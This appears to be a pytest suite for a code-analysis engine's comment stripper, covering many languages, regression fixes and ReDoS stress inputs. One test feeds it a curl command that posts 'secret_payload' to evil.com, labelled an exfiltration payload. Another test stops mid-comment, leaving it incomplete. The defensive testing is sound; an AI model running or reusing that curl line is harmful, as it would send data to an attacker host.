import pytest
import re
from unittest.mock import patch

# Adjust this import to match your project structure
from gitgalaxy.core.prism import Prism, PrismError

# ==============================================================================
# MOCK MATRIX CALIBRATION
# ==============================================================================
# We mock the language and comment definitions so the tests run deterministically
# regardless of what is inside your actual language_standards.py file.

# #386: these used to be a fictional taxonomy ("mechanical_families",
# "c_style_comment", "single_line_only", "recursive_c_style",
# "column_sensitive") that never matched the real config
# (gitgalaxy_config.py's LEXICAL_FAMILY_HEURISTICS uses "lexical_families",
# and real per-language "lexical_family" values are standard_block/
# line_exclusive/recursive_block/positional_anchored/block_exclusive/
# non_lexical) -- every test in this file passed anyway, because they never
# exercised the real config, which is exactly how prism.py's total failure
# to strip comments for any language went undetected. Renamed to match
# reality so this class of drift can't silently recur.
MOCK_COMMENT_DEFS = {
    "lexical_families": {
        "standard_block": {"delimiters": ["//", "/*", "*/"]},
        "line_exclusive": {"delimiters": ["#"]},
        "recursive_block": {"delimiters": ["//", "/*", "*/"]},
        "positional_anchored": {"delimiters": []},
    }
}

MOCK_LANG_DEFS = {
    "c": {"lexical_family": "standard_block"},
    "python": {"lexical_family": "line_exclusive"},
    "rust": {"lexical_family": "recursive_block"},
    "cobol": {"lexical_family": "positional_anchored"},
    "markdown": {"lexical_family": "prose"},
    "html": {"lexical_family": "xml"},
    "php": {"lexical_family": "standard_block"},
}


@pytest.fixture
def prism_engine():
    """Initializes the Prism with a controlled, deterministic regex matrix."""
    # We patch the SHIELD_PATTERN just in case the standard library is missing it during test time
    with patch(
        "gitgalaxy.core.prism.PRISM_CONFIG",
        {
            "SHIELD_PATTERN": r'(?P<shield>"(?:\\.|[^"\\])*"|\'(?:\\.|[^\'\\])*\'|`(?:\\.|[^`\\])*`)',
            "PYTHON_DOC_PATTERN": r"(\"\"\"[\s\S]*?\"\"\"|\'\'\'[\s\S]*?\'\'\')",
            "PHP_HEREDOC_PATTERN": r"<<<EOT[\s\S]*?EOT;",
            "PHP_MULTILINE_STRING": r"'(?:\\'|[^'])*'",
        },
    ):
        return Prism(comment_definitions=MOCK_COMMENT_DEFS, language_definitions=MOCK_LANG_DEFS)


# ==============================================================================
# TEST 1: THE BYPASS PROTOCOLS
# ==============================================================================
@pytest.mark.smoke
def test_prism_prose_bypass(prism_engine):
    """Proves that Markdown and XML are routed entirely to the Documentation stream."""
    content = "# Title\n\nThis is a markdown file.\nIt has no active logic."
    result = prism_engine.split_streams(content, primary_lang="markdown")

    assert result["code_stream"] == ""
    assert result["comment_stream"] == content
    assert result["coding_loc"] == 0
    assert result["doc_loc"] == 3


def test_prism_empty_content_short_circuits(prism_engine):
    """An empty content buffer must return the zeroed-out result shape directly, skipping all regex work."""
    result = prism_engine.split_streams("", primary_lang="python")
    assert result == {
        "code_stream": "",
        "comment_stream": "",
        "coding_loc": 0,
        "doc_loc": 0,
        "mitigations": [],
    }


def test_prism_catastrophic_failure_wraps_in_prism_error(prism_engine):
    """
    Stress test: if something inside the scan raises unexpectedly (not one
    of the specific, already-handled cases), split_streams must wrap it in a
    PrismError with the original exception chained -- never let a raw,
    unrelated exception type escape to the caller.
    """
    with patch.object(prism_engine, "_strip_segment_comments", side_effect=RuntimeError("simulated engine failure")):
        with pytest.raises(PrismError) as exc_info:
            prism_engine.split_streams("some code", primary_lang="python")

    assert "simulated engine failure" in str(exc_info.value)
    assert isinstance(exc_info.value.__cause__, RuntimeError)


def test_prism_metadata_guard(prism_engine):
    """Proves that Shebangs bypass the comment stripper and stay in the logic stream."""
    content = "#!/usr/bin/env python3\n# This is a comment\nprint('Hello')"
    result = prism_engine.split_streams(content, primary_lang="python")

    assert "#!/usr/bin/env python3" in result["code_stream"]
    assert "print('Hello')" in result["code_stream"]
    assert "# This is a comment" not in result["code_stream"]
    assert "This is a comment" in result["comment_stream"]


# ==============================================================================
# TEST 2: STRING MASKING
# ==============================================================================
def test_prism_string_shield_protection(prism_engine):
    """Proves that string literals containing comment delimiters do not trigger the stripper."""
    content = (
        'let url = "https://github.com"; // Set the target URL\n'
        'let str_block = "/* DO NOT STRIP ME */";\n'
        "/* Real block comment */"
    )
    result = prism_engine.split_streams(content, primary_lang="c")

    code = result["code_stream"]
    docs = result["comment_stream"]

    assert "https://" + "github.com" in code
    assert "/* DO NOT STRIP ME */" in code
    assert "Set the target URL" in docs
    assert "Real block comment" in docs


# ==============================================================================
# TEST 3: NESTED BLOCK PEELER
# ==============================================================================
def test_prism_nested_block_peeling(prism_engine):
    """Proves the iterative peel loop correctly extracts recursive block comments."""
    content = (
        "fn main() {\n"
        "    /* Outer comment\n"
        "       /* Inner comment */\n"
        "       Back to outer */\n"
        "    println!('Done');\n"
        "}"
    )
    result = prism_engine.split_streams(content, primary_lang="rust")

    code = result["code_stream"]
    docs = result["comment_stream"]

    assert "fn main() {" in code
    assert "println!('Done');" in code
    assert "Outer comment" not in code
    assert "Inner comment" in docs


def test_prism_nested_block_peeling_reads_the_real_lexical_families_key(prism_engine):
    """
    Regression test for a #386 follow-up: _strip_nested_comments() looked up
    self.lexical_families.get("recursive_c_style", ...) -- the OLD dead name,
    missed in the original rename pass -- and only "worked" because its
    hardcoded fallback default (["//", "/*", "*/"]) happened to coincidentally
    match "recursive_block"'s real delimiters. Using non-default delimiters
    here proves the lookup key itself is correct, not just the fallback.
    """
    prism_engine.lexical_families["recursive_block"] = {"delimiters": ["##", "<<", ">>"]}

    content = "fn main() {\n    << Outer << Inner >> Back to outer >>\n    do_work();\n}"
    result = prism_engine.split_streams(content, primary_lang="rust")

    assert "do_work();" in result["code_stream"]
    assert "Outer" not in result["code_stream"]
    assert "Inner" in result["comment_stream"]


# ==============================================================================
# TEST 4: POSITIONAL ANCHORS
# ==============================================================================
def test_prism_positional_anchors(prism_engine):
    """Proves legacy column-anchored and inline comments are handled correctly."""
    content = (
        "      * This is a COBOL column 7 comment\n"
        "       MOVE A TO B. *> This is an inline comment\n"
        "C This is a Fortran column 1 comment\n"
        "       X = 1 ! This is a Fortran inline comment"
    )

    prism_engine.POSITIONAL_ANCHORS = {"*", "C", "c", "!"}
    result = prism_engine.split_streams(content, primary_lang="cobol")

    code = result["code_stream"]
    docs = result["comment_stream"]

    assert "MOVE A TO B." in code
    assert "This is a COBOL column 7 comment" not in code
    assert "This is an inline comment" in docs


# ==============================================================================
# TEST 5: HARDENED PYTHON DOCSTRINGS
# ==============================================================================
def test_prism_python_docstring_extraction(prism_engine):
    """Proves multi-line string literals acting as docstrings are extracted."""
    content = 'def compute_hash():\n    """\n    This is a module docstring.\n    """\n    return True'
    result = prism_engine.split_streams(content, primary_lang="python")

    assert "def compute_hash():" in result["code_stream"]
    assert "This is a module docstring." in result["comment_stream"]


# ==============================================================================
# TEST 6: FORMAT & METADATA BYPASSES
# ==============================================================================
def test_prism_format_and_xml_bypass(prism_engine):
    """Proves unknown and unparsable languages skip the scanner entirely."""
    content = "some raw code // comment"
    res_unknown = prism_engine.split_streams(content, primary_lang="undeterminable")
    assert res_unknown["code_stream"] == content
    assert res_unknown["comment_stream"] == ""

    # We use chr() to prevent the HTML comment from vanishing when copying
    xml_content = "<?xml version='1.0'?>\n<data>" + chr(60) + "!-- comment --" + chr(62) + "</data>"
    res_xml = prism_engine.split_streams(xml_content, primary_lang="xml")
    assert res_xml["code_stream"] == ""
    assert chr(60) + "!-- comment --" + chr(62) in res_xml["comment_stream"]

    php_content = "<?php\n// This is a comment\n$x = 1;"
    res_php = prism_engine.split_streams(php_content, primary_lang="php")
    assert "<?php" in res_php["code_stream"]


# ==============================================================================
# TEST 7: PHP HEREDOC AND MULTILINE STRINGS
# ==============================================================================
def test_prism_php_string_extraction(prism_engine):
    """Proves PHP Heredoc and large strings are stripped to the documentation stream."""
    prism_engine.languages["php"] = {"lexical_family": "standard_block"}
    prism_engine.PHP_HEREDOC_PATTERN = re.compile(r"<<<EOT[\s\S]*?EOT;", re.M)
    prism_engine.PHP_MULTILINE_STRING = re.compile(r"'(?:\\'|[^'])*'", re.M)

    content = "<?php\n$a = <<<EOT\nMassive Text\nEOT;\n$b = 'Multi\nLine';\n// comment"
    res = prism_engine.split_streams(content, primary_lang="php")

    assert "<<<EOT" not in res["code_stream"]
    assert '""' in res["code_stream"]
    assert "Massive Text" in res["comment_stream"]


# ==============================================================================
# TEST 8: EMBEDDED PARTITIONING & BALANCED END ESCAPING
# ==============================================================================
def test_prism_embedded_partitioning_and_escaping(prism_engine):
    """Proves the Embedded Triggers accurately isolate languages."""
    prism_engine.EMBEDDED_TRIGGERS = [
        {
            "trigger": re.compile(r"<script>", re.I),
            "end": re.compile(r"</script>", re.I),
            "target": "javascript",
            "pair": None,
        },
        {
            "trigger": re.compile(r"\{", re.I),
            "end": None,
            "target": "css",
            "pair": ("{", "}"),
        },
    ]

    prism_engine.EMBEDDED_LOOKAHEAD_LIMIT = 20
    html_content = "<html><script>let x = 1; // js"
    res1 = prism_engine.split_streams(html_content, primary_lang="html")
    assert "let x = 1;" in res1["code_stream"]

    prism_engine.EMBEDDED_LOOKAHEAD_LIMIT = 50000
    css_content = r"body { content: 'escaped \}'; /* comment */ }"
    idx = prism_engine._find_balanced_end(css_content, 5, "{", "}")

    assert css_content[idx - 1] == "}"


# ==============================================================================
# TEST 9: DYNAMIC REGEX MATRIX CALIBRATION
# ==============================================================================
def test_prism_regex_matrix_calibration_edge_cases():
    """Proves all complex and fallback regex families compile correctly."""

    # We construct HTML comments dynamically to completely bypass UI clipboard erasing
    html_open = chr(60) + "!--"
    html_close = "--" + chr(62)

    # 1. Primary Branches (Full Delimiter Sets)
    primary_families = {
        "line_exclusive": {"delimiters": ["#", "<#", "#>"]},
        "multi_style_dash": {"delimiters": ["--", html_open, html_close, "{-", "-}"]},
        "embedded_syntax": {"delimiters": ["//", "/*", "*/", "#"]},
        "empty_delim": {"delimiters": []},
    }

    engine_primary = Prism(
        comment_definitions={"lexical_families": primary_families},
        language_definitions={},
    )

    assert "line_exclusive" in engine_primary.REGEX_MATRIX
    assert "multi_style_dash" in engine_primary.REGEX_MATRIX
    assert re.escape("{-") in engine_primary.REGEX_MATRIX["multi_style_dash"].pattern
    assert "embedded_syntax" in engine_primary.REGEX_MATRIX
    # Regression for #258: confirms the 4th delimiter ("#") wasn't silently
    # dropped by the unreachable duplicate elif branch.
    assert "#" in engine_primary.REGEX_MATRIX["embedded_syntax"].pattern

    # 2. Fallback Branches (Partial Delimiter Sets)
    fallback_families = {
        "multi_style_dash": {"delimiters": ["--", html_open, html_close]},
        "embedded_syntax": {"delimiters": ["//", "/*", "*/"]},
    }

    engine_fallback = Prism(
        comment_definitions={"lexical_families": fallback_families},
        language_definitions={},
    )

    assert "multi_style_dash" in engine_fallback.REGEX_MATRIX

    # We check if the safely escaped version of '


def test_prism_embedded_syntax_fourth_delimiter_not_dropped(prism_engine):
    """
    Regression test for #258: an embedded_syntax family configured with a
    4th delimiter must actually use it when stripping comments, not silently
    lose it to an unreachable duplicate elif branch.
    """
    prism_engine.languages["configlang"] = {"lexical_family": "embedded_syntax"}
    prism_engine.lexical_families["embedded_syntax"] = {"delimiters": ["//", "/*", "*/", "#"]}
    prism_engine.REGEX_MATRIX = prism_engine._compile_regex_matrix()

    content = "value = 1 # this is a hash comment\nother = 2"
    result = prism_engine.split_streams(content, primary_lang="configlang")

    assert "value = 1" in result["code_stream"]
    assert "this is a hash comment" in result["comment_stream"]
    assert "this is a hash comment" not in result["code_stream"]


# ==============================================================================
# TEST 9.5: THE REAL CONFIG, NOT THE MOCK (#386)
# ==============================================================================
def test_prism_strips_comments_against_the_real_config():
    """
    Regression test for #386: every other test in this file drives Prism
    through MOCK_COMMENT_DEFS/MOCK_LANG_DEFS, which used to be a fictional,
    internally-consistent taxonomy that never matched the real
    gitgalaxy_config.py/language_standards.py config -- meaning NONE of them
    would have caught prism.py's total failure to strip comments for any of
    the 58 real languages. This test wires up the REAL config instead, and
    proves comment stripping actually works for one language per real family
    (standard_block, line_exclusive, recursive_block, positional_anchored).
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)

    # standard_block (C)
    result = real_prism.split_streams("// a comment\nint main() {\n    /* block */\n    return 0;\n}\n", "c")
    assert "a comment" not in result["code_stream"]
    assert "a comment" in result["comment_stream"]

    # line_exclusive (Python)
    result = real_prism.split_streams("x = 1  # a comment\ny = 2\n", "python")
    assert "a comment" not in result["code_stream"]
    assert "a comment" in result["comment_stream"]

    # recursive_block (Rust)
    result = real_prism.split_streams("fn main() {\n    // a comment\n}\n", "rust")
    assert "a comment" not in result["code_stream"]
    assert "a comment" in result["comment_stream"]

    # positional_anchored (COBOL)
    result = real_prism.split_streams("       IDENTIFICATION DIVISION.\n      * a comment\n", "cobol")
    assert "a comment" not in result["code_stream"]
    assert "a comment" in result["comment_stream"]


def test_prism_sub_families_fix_the_standard_block_delimiter_gap():
    """
    Regression test for #621: sqlite, lua, haskell, powershell, and perl were
    all classified "standard_block" but don't use its C-style // and /* */
    delimiters -- they got ZERO comment stripping (empirically confirmed
    against the real config before this fix). The initial attempted fix
    (adding all 9 of standard_block's configured delimiter tokens to one
    shared regex) was rejected: it corrupted real C-family code, since `--`
    is a decrement operator and `#` is a preprocessor directive in that
    family, not a comment marker. The actual fix splits these 5 languages
    into their own families (multi_style_dash, embedded_syntax,
    recursive_block_haskell) or an existing compatible one (line_exclusive
    for perl), so standard_block's regex is never shared with them.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)

    line_comment_cases = {
        "sqlite": "SELECT 1;\n-- a secret comment\nSELECT 2;\n",
        "lua": "print(1)\n-- a secret comment\nprint(2)\n",
        "haskell": "main = do\n  -- a secret comment\n  print 1\n",
        "powershell": "Write-Host 1\n# a secret comment\nWrite-Host 2\n",
        "perl": "print 1;\n# a secret comment\nprint 2;\n",
    }
    for lang, code in line_comment_cases.items():
        result = real_prism.split_streams(code, lang)
        assert "a secret comment" not in result["code_stream"], f"{lang}: line comment leaked into code_stream"
        assert "a secret comment" in result["comment_stream"], f"{lang}: line comment was not captured"

    block_comment_cases = {
        "sqlite": ("SELECT 1;\n/* block secret */\nSELECT 2;\n", "block secret"),
        "lua": ("print(1)\n--[[\nblock secret\nspans lines\n]]\nprint(2)\n", "block secret"),
        "haskell": ("main = do\n  {- block secret -}\n  print 1\n", "block secret"),
        "powershell": ("Write-Host 1\n<# block secret #>\nWrite-Host 2\n", "block secret"),
    }
    for lang, (code, needle) in block_comment_cases.items():
        result = real_prism.split_streams(code, lang)
        assert needle not in result["code_stream"], f"{lang}: block comment leaked into code_stream"
        assert needle in result["comment_stream"], f"{lang}: block comment was not captured"


def test_prism_haskell_block_comments_actually_nest():
    """
    Regression test for #621: Haskell's own language_standards.py comment
    explicitly says its {- -} blocks "strictly support recursive nesting" --
    unlike sqlite/lua's flat delimiter handling, Haskell needed the same
    iterative inside-out peel algorithm recursive_block already uses for
    Rust/Swift/Dart/Scala, just with Haskell's -- / {- / -} tokens instead
    of C-style ones (family "recursive_block_haskell").
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    result = real_prism.split_streams(
        "main = do\n  {- outer {- inner secret -} still outer secret -}\n  print 1\n",
        "haskell",
    )
    assert "outer secret" not in result["code_stream"]
    assert "inner secret" not in result["code_stream"]
    assert "inner secret" in result["comment_stream"]
    assert "outer secret" in result["comment_stream"]


def test_prism_livecode_multi_style_live_comments():
    """
    Regression test for #708: livecode uses both classic xTalk line comments (--),
    modern script server comments (#), LiveCode Builder comments (//), and
    C-style blocks (/* */).
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)

    code = "put 1 into x\n-- secret dash comment\n# secret hash comment\n// secret slash comment\n/* secret block comment */\nput 2 into x"
    result = real_prism.split_streams(code, "livecode")

    assert "secret dash comment" not in result["code_stream"]
    assert "secret hash comment" not in result["code_stream"]
    assert "secret slash comment" not in result["code_stream"]
    assert "secret block comment" not in result["code_stream"]

    assert "secret dash comment" in result["comment_stream"]
    assert "secret hash comment" in result["comment_stream"]
    assert "secret slash comment" in result["comment_stream"]
    assert "secret block comment" in result["comment_stream"]


def test_prism_standard_block_c_family_unaffected_by_sub_family_split():
    """
    Regression guard for #621: splitting sqlite/lua/haskell/powershell/perl
    out of "standard_block" must not change stripping behavior for the ~24
    C-style languages that remain in it -- especially `--` (decrement
    operator) and `#` (preprocessor directive), both of which the rejected
    first-attempt fix broke by treating them as shared comment tokens.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)

    cpp_code = (
        "int main() {\n"
        "    int i = 10;\n"
        "    while (i-- > 0) {\n"
        "        do_something(i);\n"
        "    }\n"
        "    #include <vector>\n"
        "    return 0;\n"
        "}\n"
    )
    result = real_prism.split_streams(cpp_code, "cpp")
    assert "i-- > 0" in result["code_stream"], "C-family decrement operator was corrupted"
    assert "#include <vector>" in result["code_stream"], "C-family preprocessor directive was corrupted"

    for lang, code in {
        "c": "// a comment\nint main() {\n    /* a block comment */\n    return 0;\n}\n",
        "javascript": "// a comment\nfunction f() {\n  /* a block comment */\n  return 1;\n}\n",
    }.items():
        result = real_prism.split_streams(code, lang)
        assert "a comment" not in result["code_stream"]
        assert "a comment" in result["comment_stream"]
        assert "a block comment" not in result["code_stream"]
        assert "a block comment" in result["comment_stream"]


def test_prism_dash_comment_string_literal_shielding():
    """
    Regression guard for #621: a '--' or '#' sequence inside a real string
    literal must still be shielded from the new multi_style_dash/
    embedded_syntax comment patterns.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    result = real_prism.split_streams('x = "this -- is not a comment"\n', "lua")
    assert "this -- is not a comment" in result["code_stream"]


def test_prism_haskell_and_powershell_string_literal_shielding():
    """
    Extends the #621 shielding guard to the other two new families:
    Haskell's '--' inside a string must not be treated as a line comment by
    the recursive_block_haskell nested-peel algorithm, and PowerShell's '#'
    inside a string must not be treated as a comment by embedded_syntax.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)

    result = real_prism.split_streams('x = "this -- is not a comment"\n', "haskell")
    assert "this -- is not a comment" in result["code_stream"]

    result = real_prism.split_streams('$x = "this # is not a comment"\n', "powershell")
    assert "this # is not a comment" in result["code_stream"]


# ==============================================================================
# TEST 9.6: BLOCK_EXCLUSIVE / NON_LEXICAL (#622)
# ==============================================================================
def test_prism_block_exclusive_and_non_lexical_real_config():
    """
    Part of #622. xml (block_exclusive) and plaintext (non_lexical) are each
    the ONLY real language currently assigned to their family. Both also
    happen to be hardcoded into split_streams()'s "prose bypass" list
    (alongside markdown), which routes them to the documentation stream
    before family dispatch ever runs -- so this proves that behavior against
    the REAL lexical_family values (matching #386's "test the real config,
    not a mock" discipline), not just that the bypass mechanism works at all
    (test_prism_format_and_xml_bypass already covers that against a mock).
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    assert LANGUAGE_DEFINITIONS["xml"]["lexical_family"] == "block_exclusive"
    assert LANGUAGE_DEFINITIONS["plaintext"]["lexical_family"] == "non_lexical"

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)

    xml_content = "<data>" + chr(60) + "!-- a secret comment --" + chr(62) + "</data>"
    result = real_prism.split_streams(xml_content, "xml")
    assert result["code_stream"] == ""
    assert "a secret comment" in result["comment_stream"]

    plaintext_content = "just some plain text\nwith a secret comment in it\n"
    result = real_prism.split_streams(plaintext_content, "plaintext")
    assert result["code_stream"] == ""
    assert "a secret comment" in result["comment_stream"]


def test_prism_non_lexical_has_no_compiled_pattern():
    """
    Part of #622/#733: non_lexical is NOT in _compile_regex_matrix()'s branch list
    at all (unlike standard_block/line_exclusive/multi_style_dash/embedded_syntax/block_exclusive),
    so REGEX_MATRIX has no entry for it. This is harmless TODAY
    only because plaintext -- the sole real member of this family --
    is also hardcoded into split_streams()'s "prose bypass" list, which
    intercepts it before family dispatch is ever consulted.

    If a FUTURE language is assigned non_lexical without
    also being added to that bypass list, it would silently fall through to
    "no pattern registered" and get zero comment stripping.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    assert "non_lexical" not in real_prism.REGEX_MATRIX

    # The fallback handles it by leaving everything in code_stream
    code, comment = real_prism._strip_segment_comments("some text", "fake_lang", "non_lexical")
    assert code == "some text"
    assert comment == ""

    # Prove block_exclusive IS registered now
    assert "block_exclusive" in real_prism.REGEX_MATRIX

    # Prove that block_exclusive DOES strip comments now
    code, comments = real_prism._strip_segment_comments(
        "some content <!-- actually stripped --> more content", "hypothetical_lang", "block_exclusive"
    )
    assert code == "some content  more content"
    assert "actually stripped" in comments


# ==============================================================================
# TEST 9.7: REDOS IMMUNITY FOR THE REAL PER-FAMILY PATTERNS (#622)
# ==============================================================================
def test_prism_real_family_patterns_are_redos_immune():
    """
    Part of #622: test_prism_suppression_regex_bomb already proves the
    'galaxyscope:ignore' suppression regex is ReDoS-immune, and
    test_prism_regex_matrix_calibration_edge_cases proves the branch-
    selection logic works against synthetic delimiter sets -- but neither
    exercises the ACTUAL compiled patterns for the real families against a
    pathological payload. This does, using the same "must resolve well
    under a generous timeout" bar as test_prism_suppression_regex_bomb.
    """
    import time

    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)

    poison_cases = {
        # standard_block (C-style, 24 languages)
        "cpp": "/* " + "* " * 20000 + "*/",
        # multi_style_dash (sqlite, lua) -- long runs of the shared '-' token
        "lua": "-- " + "- " * 20000,
        # embedded_syntax (powershell) -- long runs of '#'
        "powershell": "# " + "# " * 20000,
        # line_exclusive (python, perl, ~20 others)
        "perl": "# " + "# " * 20000,
        # recursive_block_haskell -- deeply nested-looking (but never
        # actually closed) block markers
        "haskell": "{- " * 5000 + "unterminated",
        # recursive_block_lisp (#770) -- same shape as haskell above, with
        # scheme's own #| token instead of {-.
        "scheme": "#| " * 5000 + "unterminated",
    }
    for lang, payload in poison_cases.items():
        start = time.perf_counter()
        real_prism.split_streams(payload, lang)
        duration = time.perf_counter() - start
        assert duration < 2.0, f"{lang}: real family pattern took {duration:.2f}s on a pathological payload"


# ==============================================================================
# TEST 10: INLINE SUPPRESSION EXTRACTION (Devious Edge Cases)
# ==============================================================================
def test_prism_inline_suppression_extraction(prism_engine):
    """
    DEVIOUS EDGE CASES:
    1. Case insensitivity (GALAXYscope:IGNORE)
    2. Multiple tags on a single line
    3. The "String Trap" (Extraction from within a literal)
    4. Dashes and underscores in risk names
    """
    content = """
    // Normal suppression
    // galaxyscope:ignore logic_bomb

    /* Weird casing suppression */
    /* GALAXYscope:IGNORE MeMoRy_CoRrUpTiOn */

    # Multiple suppressions on one line with erratic spacing
    # galaxyscope:ignore tech_debt       galaxyscope:ignore secrets-risk

    let warning = "Do not galaxyscope:ignore injection_surface in this block!";
    """

    result = prism_engine.split_streams(content, primary_lang="javascript")

    mitigations = result.get("mitigations", [])

    # Assert it caught everything and lowercased the risk names
    assert "logic_bomb" in mitigations, "Failed to extract standard suppression."
    assert "memory_corruption" in mitigations, "Failed to handle erratic casing."
    assert "tech_debt" in mitigations, "Failed to extract multiple tags (1)."
    assert "secrets-risk" in mitigations, "Failed to handle dashes in risk names."

    # The "String Trap" - Because extraction happens at the top of split_streams,
    # it WILL extract from string literals. This test explicitly proves this behavior.
    assert "injection_surface" in mitigations, "Failed the String Trap extraction."


# ==============================================================================
# TEST 11: THE SUPPRESSION REGEX BOMB (Memory / ReDoS Exhaustion)
# ==============================================================================
import time


def test_prism_suppression_regex_bomb(prism_engine):
    """
    DEVIOUS EDGE CASE: An attacker uploads a file with 100,000 inline suppressions
    to trigger Catastrophic Backtracking (ReDoS) and starve the worker thread,
    or consume all available RAM with the mitigations array.
    """
    # Generate a massive file with 100,000 suppression tags
    massive_content = "// galaxyscope:ignore everything \n" * 100000

    start_time = time.time()
    result = prism_engine.split_streams(massive_content, primary_lang="javascript")
    duration = time.time() - start_time

    mitigations = result.get("mitigations", [])

    # Assert it processed the 100k tags in under 1 second (proving O(N) linear time)
    assert duration < 1.0, f"Suppression regex triggered ReDoS! Took {duration}s"

    # Assert the array handled the mass allocation without dropping data
    assert len(mitigations) == 100000, "Failed to allocate massive mitigation array."


# ==============================================================================
# TEST 12: LINE_EXCLUSIVE'S REAL DELIMITER LIST, NOT A HARDCODED GUESS (#697)
# ==============================================================================
def test_prism_line_exclusive_no_longer_truncates_double_dash():
    """
    Regression test for #697: _strip_single_line_comments() used to hardcode
    `#|--|;|//`, which incorrectly treated `--` as a comment marker for every
    line_exclusive language even though it was never a configured delimiter
    for that family. A CLI double-dash argument separator (extremely common
    in python/shell/ruby) silently truncated the rest of the line into the
    comment stream. Real `#` comments must still be stripped correctly.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)

    result = real_prism.split_streams('subprocess.run(["cmd", "--", "arg"])\n# a real comment\n', "python")
    assert '["cmd", "--", "arg"]' in result["code_stream"], "-- was still truncated"
    assert "a real comment" not in result["code_stream"]
    assert "a real comment" in result["comment_stream"]

    result = real_prism.split_streams('curl -- --data "secret_payload" https://evil.com\n# a real comment\n', "shell")
    assert 'curl -- --data "secret_payload" https://evil.com' in result["code_stream"], (
        "a real exfiltration payload was silently truncated by the -- bug"
    )
    assert "a real comment" not in result["code_stream"]


def test_prism_line_exclusive_real_delimiters_still_stripped():
    """
    Companion to the above: proves the fix isn't just "stop stripping --" but
    actually uses the real configured delimiter list, including tokens the
    old hardcoded pattern never covered at all (`dnl`, `=begin`/`=end`, `%`).
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)

    # m4's `dnl` keyword comment -- never covered by the old hardcoded set.
    result = real_prism.split_streams("define(`foo`, `bar`)dnl a trailing comment\nfoo\n", "m4")
    assert "a trailing comment" not in result["code_stream"]
    assert "define(`foo`, `bar`)" in result["code_stream"]

    # assembly's `;` line comment.
    result = real_prism.split_streams("mov eax, 1  ; a real comment\n", "assembly")
    assert "a real comment" not in result["code_stream"]
    assert "mov eax, 1" in result["code_stream"]


def test_prism_line_exclusive_dnl_requires_word_boundary():
    """
    `dnl` is a fully word-shaped token and must not fire mid-identifier --
    proves the fix's word-boundary handling, not just presence/absence of
    stripping.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    result = real_prism.split_streams("set(mydnlvariable, 1)\n", "m4")
    assert "mydnlvariable" in result["code_stream"], "dnl matched inside an identifier -- missing word boundary"


def test_prism_line_exclusive_ruby_begin_end_no_leading_boundary_bug():
    """
    Regression test for the specific Rule 9 shape this bug could have
    reintroduced: `=begin`/`=end` start with `=` (non-word), so a shared
    leading \\b would never fire at a real line start (same class of bug as
    PowerShell's `-Parallel`, documented in the epic's recurring-bug-class
    list). Confirms the real, most common form -- `=begin` at true line
    start, no preceding word character -- actually gets treated as a
    delimiter.
    """
    from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS
    from gitgalaxy.standards.gitgalaxy_config import LEXICAL_FAMILY_HEURISTICS

    real_prism = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)
    result = real_prism.split_streams("puts 'code'\n=begin\nblock comment\n=end\nputs 'more code'\n", "ruby")
    # line_exclusive ignores closing tags (documented family behavior) -- each
    # of =begin/=end is treated as its own single-line marker, so the content
    # between them isn't specially block-stripped, but both marker lines
    # themselves must be recognized (not silently require a preceding word
    # character that real code never has).
    assert "puts 'code'" in result["code_stream"]
    assert "puts 'more code'" in result["code_stream"]


